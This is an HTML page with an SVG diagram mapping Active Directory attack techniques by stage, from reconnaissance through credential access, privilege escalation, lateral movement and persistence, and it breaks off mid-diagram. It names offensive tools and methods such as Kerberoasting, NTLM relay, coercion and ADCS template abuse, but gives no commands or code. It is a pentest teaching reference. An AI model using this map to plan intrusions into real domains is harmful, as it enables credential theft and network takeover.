<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Active Directory — Attack Architecture Map</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }

  :root {
    --bg: #0a0e17;
    --bg-card: #111827;
    --bg-card-hover: #1a2332;
    --border: #1e2d3d;
    --border-active: #2563eb;
    --text: #e2e8f0;
    --text-dim: #64748b;
    --text-bright: #f8fafc;
    --blue: #3b82f6;
    --blue-dim: #1e40af;
    --cyan: #06b6d4;
    --green: #10b981;
    --orange: #f59e0b;
    --red: #ef4444;
    --purple: #8b5cf6;
    --pink: #ec4899;
    --teal: #14b8a6;
    --yellow: #eab308;
    --lime: #84cc16;
    --rose: #f43f5e;
    --indigo: #6366f1;
  }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'IBM Plex Sans', sans-serif;
    min-height: 100vh;
    overflow-x: hidden;
  }

  .noise-overlay {
    position: fixed;
    top: 0; left: 0; right: 0; bottom: 0;
    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 256 256' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='n'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='4' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23n)' opacity='0.03'/%3E%3C/svg%3E");
    pointer-events: none;
    z-index: 1000;
  }

  .container { max-width: 1500px; margin: 0 auto; padding: 40px 30px; }

  header { text-align: center; margin-bottom: 50px; }
  header h1 { font-family: 'JetBrains Mono', monospace; font-size: 28px; font-weight: 700; color: var(--text-bright); letter-spacing: -0.5px; margin-bottom: 8px; }
  header h1 span { color: var(--red); }
  header h1 .acc2 { color: var(--cyan); }
  header .subtitle { font-size: 14px; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-weight: 300; }
  header .credit { font-size: 11px; color: var(--text-dim); font-family: 'JetBrains Mono', monospace; font-weight: 300; margin-top: 6px; opacity: 0.6; }

  .svg-container { width: 100%; overflow-x: auto; margin: 30px 0; padding: 20px 0; }
  .svg-container svg { display: block; margin: 0 auto; }
  .separator { height: 1px; background: linear-gradient(90deg, transparent, var(--border), transparent); margin: 50px 0; }

  .section-header { margin-top: 60px; margin-bottom: 30px; }
  .section-header h2 { font-family: 'JetBrains Mono', monospace; font-size: 18px; font-weight: 600; color: var(--text-bright); padding-bottom: 12px; border-bottom: 1px solid var(--border); }
  .section-header h2 span { color: var(--cyan); }
  .section-header h2 .red { color: var(--red); }
  .section-header h2 .green { color: var(--green); }
  .section-header h2 .orange { color: var(--orange); }
  .section-header h2 .purple { color: var(--purple); }
  .section-header h2 .pink { color: var(--pink); }
  .section-header h2 .teal { color: var(--teal); }
  .section-header h2 .yellow { color: var(--yellow); }
  .section-desc { font-size: 13px; color: var(--text-dim); margin-top: 8px; line-height: 1.6; }

  .flow-row { display: flex; align-items: center; gap: 0; margin-bottom: 16px; flex-wrap: nowrap; overflow-x: auto; padding: 6px 0; }
  .flow-node { background: var(--bg-card); border: 1px solid var(--border); border-radius: 6px; padding: 8px 12px; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text); white-space: nowrap; flex-shrink: 0; transition: all 0.2s ease; }
  .flow-node:hover { background: var(--bg-card-hover); transform: translateY(-1px); }
  .flow-arrow { display: flex; align-items: center; padding: 0 3px; flex-shrink: 0; }
  .flow-arrow svg { width: 36px; height: 20px; }
  .flow-arrow .arrow-label { font-family: 'JetBrains Mono', monospace; font-size: 8px; color: var(--text-dim); text-align: center; display: block; margin-top: -2px; }

  .flow-node.hl-red { border-color: var(--red); box-shadow: 0 0 10px rgba(239,68,68,0.15); }
  .flow-node.hl-blue { border-color: var(--blue); box-shadow: 0 0 10px rgba(59,130,246,0.15); }
  .flow-node.hl-cyan { border-color: var(--cyan); box-shadow: 0 0 10px rgba(6,182,212,0.15); }
  .flow-node.hl-green { border-color: var(--green); box-shadow: 0 0 10px rgba(16,185,129,0.15); }
  .flow-node.hl-orange { border-color: var(--orange); box-shadow: 0 0 10px rgba(245,158,11,0.15); }
  .flow-node.hl-purple { border-color: var(--purple); box-shadow: 0 0 10px rgba(139,92,246,0.15); }
  .flow-node.hl-pink { border-color: var(--pink); box-shadow: 0 0 10px rgba(236,72,153,0.15); }
  .flow-node.hl-teal { border-color: var(--teal); box-shadow: 0 0 10px rgba(20,184,166,0.15); }
  .flow-node.hl-yellow { border-color: var(--yellow); box-shadow: 0 0 10px rgba(234,179,8,0.15); }
  .flow-node.hl-rose { border-color: var(--rose); box-shadow: 0 0 10px rgba(244,63,94,0.15); }

  .flow-title { font-family: 'JetBrains Mono', monospace; font-size: 12px; font-weight: 600; margin-bottom: 10px; }
  .flow-title.red { color: var(--red); } .flow-title.blue { color: var(--blue); } .flow-title.green { color: var(--green); }
  .flow-title.orange { color: var(--orange); } .flow-title.purple { color: var(--purple); } .flow-title.pink { color: var(--pink); }
  .flow-title.cyan { color: var(--cyan); } .flow-title.teal { color: var(--teal); } .flow-title.yellow { color: var(--yellow); }
  .flow-title.rose { color: var(--rose); }
  .flow-block { margin-bottom: 28px; }

  .details-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(360px, 1fr)); gap: 20px; margin-top: 24px; }
  .detail-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 22px; transition: border-color 0.2s; }
  .detail-card:hover { border-color: var(--border-active); }
  .detail-card h3 { font-family: 'JetBrains Mono', monospace; font-size: 14px; font-weight: 600; color: var(--text-bright); margin-bottom: 4px; }
  .detail-card .card-sub { font-family: 'JetBrains Mono', monospace; font-size: 10px; color: var(--text-dim); margin-bottom: 12px; letter-spacing: 0.5px; }
  .detail-card .card-body { font-size: 12px; color: var(--text-dim); line-height: 1.7; }
  .detail-card .card-body strong { color: var(--text); font-weight: 500; }
  .detail-card .card-body code { font-family: 'JetBrains Mono', monospace; font-size: 10px; background: rgba(6,182,212,0.08); color: var(--cyan); padding: 2px 6px; border-radius: 3px; }
  .card-list { list-style: none; padding: 0; margin-top: 8px; }
  .card-list li { font-size: 11px; color: var(--text-dim); padding: 3px 0 3px 16px; position: relative; line-height: 1.6; }
  .card-list li::before { content: '›'; position: absolute; left: 0; color: var(--cyan); font-weight: 700; }
  .card-list li code { font-family: 'JetBrains Mono', monospace; font-size: 10px; background: rgba(6,182,212,0.08); color: var(--cyan); padding: 1px 5px; border-radius: 3px; }
  .card-list li .tool { background: rgba(236,72,153,0.1); color: var(--pink); }
  .card-list li .vuln { background: rgba(239,68,68,0.1); color: var(--red); }

  .tag { font-family: 'JetBrains Mono', monospace; font-size: 9px; font-weight: 600; text-transform: uppercase; letter-spacing: 1px; padding: 3px 8px; border-radius: 4px; display: inline-block; margin-bottom: 8px; margin-right: 4px; }
  .tag.recon { background: rgba(59,130,246,0.15); color: var(--blue); }
  .tag.cred { background: rgba(245,158,11,0.15); color: var(--orange); }
  .tag.privesc { background: rgba(239,68,68,0.15); color: var(--red); }
  .tag.lateral { background: rgba(16,185,129,0.15); color: var(--green); }
  .tag.persist { background: rgba(139,92,246,0.15); color: var(--purple); }
  .tag.domdom { background: rgba(236,72,153,0.15); color: var(--pink); }
  .tag.adcs { background: rgba(6,182,212,0.15); color: var(--cyan); }
  .tag.sccm { background: rgba(20,184,166,0.15); color: var(--teal); }
  .tag.trust { background: rgba(234,179,8,0.15); color: var(--yellow); }
  .tag.acl { background: rgba(244,63,94,0.15); color: var(--rose); }
  .tag.deleg { background: rgba(99,102,241,0.15); color: var(--indigo); }
  .tag.dns { background: rgba(132,204,22,0.15); color: var(--lime); }

  .data-flow-card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 10px; padding: 24px; margin-top: 20px; }
  .data-flow-card h4 { font-family: 'JetBrains Mono', monospace; font-size: 13px; font-weight: 600; color: var(--text-bright); margin-bottom: 12px; }
  .data-flow-card pre { font-family: 'JetBrains Mono', monospace; font-size: 11px; line-height: 1.7; color: var(--text-dim); overflow-x: auto; }
  .data-flow-card pre .comment { color: #4a6a4a; }
  .data-flow-card pre .key { color: var(--cyan); }
  .data-flow-card pre .val { color: var(--orange); }
  .data-flow-card pre .type { color: var(--purple); }
  .data-flow-card pre .danger { color: var(--red); }

  footer { text-align: center; margin-top: 60px; padding: 30px 0; border-top: 1px solid var(--border); font-family: 'JetBrains Mono', monospace; font-size: 11px; color: var(--text-dim); }
  footer a { color: var(--cyan); text-decoration: none; }
  footer a:hover { text-decoration: underline; }

  .detail-card.border-red { border-left: 3px solid var(--red); }
  .detail-card.border-blue { border-left: 3px solid var(--blue); }
  .detail-card.border-cyan { border-left: 3px solid var(--cyan); }
  .detail-card.border-green { border-left: 3px solid var(--green); }
  .detail-card.border-orange { border-left: 3px solid var(--orange); }
  .detail-card.border-purple { border-left: 3px solid var(--purple); }
  .detail-card.border-pink { border-left: 3px solid var(--pink); }
  .detail-card.border-teal { border-left: 3px solid var(--teal); }
  .detail-card.border-yellow { border-left: 3px solid var(--yellow); }
  .detail-card.border-rose { border-left: 3px solid var(--rose); }
  .detail-card.border-indigo { border-left: 3px solid var(--indigo); }
  .detail-card.border-lime { border-left: 3px solid var(--lime); }
</style>
</head>
<body>
<div class="noise-overlay"></div>
<div class="container">

<header>
  <h1>Active Directory <span>Attack</span> <span class="acc2">Architecture</span> Map</h1>
  <div class="subtitle">Comprehensive Pentest Reference — From Recon to Domain Dominance</div>
  <div class="credit"></div>
</header>

<!-- ==================== MAIN SVG ARCHITECTURE DIAGRAM ==================== -->
<div class="svg-container">
<svg viewBox="0 0 1400 980" width="1400" height="980" xmlns="http://www.w3.org/2000/svg">
  <defs>
    <marker id="arrowR" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#ef4444" opacity="0.7"/></marker>
    <marker id="arrowG" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#10b981" opacity="0.7"/></marker>
    <marker id="arrowC" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#06b6d4" opacity="0.7"/></marker>
    <marker id="arrowO" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#f59e0b" opacity="0.7"/></marker>
    <marker id="arrowP" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#8b5cf6" opacity="0.7"/></marker>
    <marker id="arrowPk" markerWidth="8" markerHeight="6" refX="8" refY="3" orient="auto"><polygon points="0 0, 8 3, 0 6" fill="#ec4899" opacity="0.7"/></marker>
  </defs>

  <!-- Background zones -->
  <rect x="0" y="40" width="220" height="920" rx="12" fill="#111827" stroke="#1e2d3d" stroke-width="1" opacity="0.5"/>
  <rect x="235" y="40" width="220" height="920" rx="12" fill="#111827" stroke="#1e2d3d" stroke-width="1" opacity="0.5"/>
  <rect x="470" y="40" width="240" height="920" rx="12" fill="#0f1729" stroke="#7f1d1d" stroke-width="1" opacity="0.5"/>
  <rect x="725" y="40" width="230" height="920" rx="12" fill="#0f1729" stroke="#164e63" stroke-width="1" opacity="0.6"/>
  <rect x="970" y="40" width="200" height="920" rx="12" fill="#111827" stroke="#1e2d3d" stroke-width="1" opacity="0.5"/>
  <rect x="1185" y="40" width="200" height="920" rx="12" fill="#0f1729" stroke="#831843" stroke-width="1" opacity="0.5"/>

  <!-- Zone labels -->
  <text x="110" y="28" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#3b82f6" font-weight="600" letter-spacing="1.5">RECONNAISSANCE</text>
  <text x="345" y="28" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#f59e0b" font-weight="600" letter-spacing="1.5">CREDENTIAL ACCESS</text>
  <text x="590" y="28" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#ef4444" font-weight="600" letter-spacing="1.5">PRIVILEGE ESCALATION</text>
  <text x="840" y="28" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#06b6d4" font-weight="600" letter-spacing="1.5">LATERAL MOVEMENT</text>
  <text x="1070" y="28" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#8b5cf6" font-weight="600" letter-spacing="1.5">PERSISTENCE</text>
  <text x="1285" y="28" text-anchor="middle" font-family="JetBrains Mono" font-size="10" fill="#ec4899" font-weight="600" letter-spacing="1.5">DOMAIN DOMINANCE</text>

  <!-- RECON column -->
  <rect x="15" y="65" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="86" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Network Scan</text>
  <text x="110" y="103" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">nmap &bull; CrackMapExec &bull; netexec</text>
  <rect x="15" y="130" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="151" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">BloodHound</text>
  <text x="110" y="168" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">SharpHound &bull; bloodhound-python</text>
  <rect x="15" y="195" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="216" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">LDAP Enum</text>
  <text x="110" y="233" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">ldapsearch &bull; ldeep &bull; windapsearch</text>
  <rect x="15" y="260" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="281" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">SMB Enum</text>
  <text x="110" y="298" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">enum4linux &bull; smbclient &bull; shares</text>
  <rect x="15" y="325" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="346" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">DNS / ADIDNS Enum</text>
  <text x="110" y="363" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">dnstool &bull; adidnsdump</text>
  <rect x="15" y="390" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="411" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">ADCS Enum</text>
  <text x="110" y="428" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">certipy find &bull; Certify</text>
  <rect x="15" y="455" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="476" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">SCCM Enum</text>
  <text x="110" y="493" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">sccmhunter &bull; SharpSCCM</text>
  <rect x="15" y="520" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="541" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Trust Enum</text>
  <text x="110" y="558" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">ldeep trusts &bull; BH map trusts</text>
  <rect x="15" y="585" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="606" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Delegation Enum</text>
  <text x="110" y="623" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">findDelegation &bull; BH Cypher</text>
  <rect x="15" y="650" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="671" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">ACL Enum</text>
  <text x="110" y="688" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">dacledit read &bull; BH ACL edges</text>
  <rect x="15" y="715" width="190" height="50" rx="8" fill="#1a2332" stroke="#3b82f6" stroke-width="1"/>
  <text x="110" y="736" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">GPO Enum</text>
  <text x="110" y="753" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">GPOddity &bull; SharpGPOAbuse</text>

  <!-- CREDENTIAL ACCESS column -->
  <rect x="250" y="65" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="86" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">AS-REP Roasting</text>
  <text x="345" y="103" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">GetNPUsers &bull; no preauth</text>
  <rect x="250" y="130" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="151" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Kerberoasting</text>
  <text x="345" y="168" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">GetUserSPNs &bull; hashcat 13100</text>
  <rect x="250" y="195" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="216" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Password Spray</text>
  <text x="345" y="233" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">netexec &bull; kerbrute &bull; spray</text>
  <rect x="250" y="260" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="281" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">NTLM Relay</text>
  <text x="345" y="298" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">ntlmrelayx &bull; Responder</text>
  <rect x="250" y="325" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="346" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Coercion</text>
  <text x="345" y="363" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">PetitPotam &bull; Coercer &bull; DFSCoerce</text>
  <rect x="250" y="390" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="411" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">DPAPI Secrets</text>
  <text x="345" y="428" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">DonPAPI &bull; SharpDPAPI &bull; dploot</text>
  <rect x="250" y="455" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="476" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">LAPS / gMSA Read</text>
  <text x="345" y="493" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">pyLAPS &bull; gMSADumper</text>
  <rect x="250" y="520" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="541" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Timeroasting</text>
  <text x="345" y="558" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">NTP ms-SNTP &bull; computer hashes</text>
  <rect x="250" y="585" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="606" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Targeted Kerberoast</text>
  <text x="345" y="623" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">GenericWrite &rarr; set SPN &rarr; TGS</text>
  <rect x="250" y="650" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="671" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Shadow Credentials</text>
  <text x="345" y="688" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">msDS-KeyCredentialLink</text>
  <rect x="250" y="715" width="190" height="50" rx="8" fill="#1a2332" stroke="#f59e0b" stroke-width="1"/>
  <text x="345" y="736" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">SCCM Creds</text>
  <text x="345" y="753" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">NAA &bull; Task Sequences &bull; PXE</text>

  <!-- PRIVESC column -->
  <rect x="485" y="65" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="86" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">ACL Abuse Chain</text>
  <text x="590" y="107" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">ForcePwd &rarr; GenWrite &rarr; WriteDACL &rarr; GenAll</text>
  <rect x="485" y="135" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="156" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">Delegation Abuse</text>
  <text x="590" y="177" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Unconstrained &bull; Constrained &bull; RBCD</text>
  <rect x="485" y="205" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="226" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">ADCS ESC1-ESC8</text>
  <text x="590" y="247" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">certipy &bull; Certify &bull; template abuse</text>
  <rect x="485" y="275" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="296" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">ADCS ESC9-ESC16</text>
  <text x="590" y="317" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">ESC15/EKUwu &bull; cert mapping</text>
  <rect x="485" y="345" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="366" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">SCCM Takeover</text>
  <text x="590" y="387" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">TAKEOVER 1-9 &bull; site server relay</text>
  <rect x="485" y="415" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="436" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">ADIDNS Poisoning</text>
  <text x="590" y="457" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Time Bombs &bull; Record Injection</text>
  <rect x="485" y="485" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="506" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">GPO Abuse</text>
  <text x="590" y="527" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">SharpGPOAbuse &bull; GPOddity</text>
  <rect x="485" y="555" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="576" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">Trust Escalation</text>
  <text x="590" y="597" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Child &rarr; Parent &bull; raiseChild</text>
  <rect x="485" y="625" width="210" height="55" rx="8" fill="#1a2332" stroke="#ef4444" stroke-width="1.5"/>
  <text x="590" y="646" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#ef4444" font-weight="600">S4U Abuse Chain</text>
  <text x="590" y="667" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">S4U2Self + S4U2Proxy &rarr; impersonate</text>

  <!-- LATERAL column -->
  <rect x="740" y="65" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="86" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Remote Exec</text>
  <text x="840" y="103" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">psexec &bull; wmiexec &bull; smbexec</text>
  <rect x="740" y="130" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="151" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Pass the Hash</text>
  <text x="840" y="168" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">NT hash &rarr; auth as user</text>
  <rect x="740" y="195" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="216" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Pass the Ticket</text>
  <text x="840" y="233" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">TGT/TGS &rarr; KRB auth</text>
  <rect x="740" y="260" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="281" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Pass the Cert</text>
  <text x="840" y="298" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">PKINIT &bull; certipy auth</text>
  <rect x="740" y="325" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="346" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">RDP / WinRM</text>
  <text x="840" y="363" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">xfreerdp &bull; evil-winrm</text>
  <rect x="740" y="390" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="411" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">NTLM Relay Pivot</text>
  <text x="840" y="428" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">SMB &rarr; LDAP &bull; HTTP &rarr; AD</text>
  <rect x="740" y="455" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="476" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">SCCM Deploy</text>
  <text x="840" y="493" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">EXEC-1 app &bull; EXEC-2 script</text>
  <rect x="740" y="520" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="541" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Forest Pivot</text>
  <text x="840" y="558" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">SID History &bull; Foreign Groups</text>
  <rect x="740" y="585" width="200" height="50" rx="8" fill="#1a2332" stroke="#06b6d4" stroke-width="1"/>
  <text x="840" y="606" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Over-pass-the-Hash</text>
  <text x="840" y="623" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">NT hash &rarr; Kerberos TGT</text>

  <!-- PERSISTENCE column -->
  <rect x="985" y="65" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="86" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Shadow Creds</text>
  <text x="1070" y="103" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">msDS-KeyCredentialLink</text>
  <rect x="985" y="130" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="151" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Rogue Certificate</text>
  <text x="1070" y="168" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Forge CA &bull; stolen CA key</text>
  <rect x="985" y="195" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="216" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">Silver Ticket</text>
  <text x="1070" y="233" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">Service hash &rarr; forged TGS</text>
  <rect x="985" y="260" width="170" height="50" rx="8" fill="#1a2332" stroke="#8b5cf6" stroke-width="1"/>
  <text x="1070" y="281" text-anchor="middle" font-family="JetBrains Mono" font-size="11" fill="#f8fafc" font-weight="600">AdminSDHolder</text>
  <text x="1070" y="298" text-anchor="middle" font-family="JetBrains Mono" font-size="9" fill="#64748b">ACL propagation every 60m</text>
